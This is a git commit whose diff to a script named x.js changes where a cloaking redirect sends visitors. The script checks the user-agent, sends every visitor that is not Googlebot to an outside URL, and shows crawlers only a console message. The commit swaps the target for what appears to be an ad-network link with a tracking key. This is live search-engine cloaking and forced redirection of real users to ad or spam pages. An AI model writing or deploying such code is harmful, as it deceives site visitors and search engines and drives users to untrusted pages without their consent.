d539c14b25d89bb3beb96496b7f2f758388b2596
xxx-xnx <kazariah.gorder@mailmagnet.co>
2026-09-18 21:15:08 +0600

    Update x.js

--- x.js
+++ x.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://voirademagi.unaux.com/kalu-pagla/";
+  window.location.href = "https://www.profitableratecpmnetwork.com/pgssj23nq8?key=c4c4d21bf3297d813fdd2165038b38f6";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
